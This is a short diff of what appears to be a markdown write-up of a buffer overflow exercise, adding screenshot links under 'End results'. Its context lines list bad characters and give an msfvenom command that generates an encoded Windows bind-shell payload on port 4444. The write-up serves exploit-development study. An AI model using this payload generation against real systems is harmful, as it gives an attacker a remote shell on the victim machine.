@@ -29,3 +29,11 @@ I have discovered the following characters being bad: `0x0 0xA 0xD`
 # Lastly, we need to write a payload.
 This will remove the bad chars in the exploit for it to make work.
 msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d' -f python -e x86/alpha_mixed
+
+
+# End results.
+<img width="589" height="295" alt="asdM" src="https://github.com/user-attachments/assets/5fac1b66-fc98-4bae-af77-bfb6534b4b80" />
+
+<img width="518" height="228" alt="asM" src="https://github.com/user-attachments/assets/b06cfa37-4945-45dd-a3cc-9acf4bc9217e" />
+
+
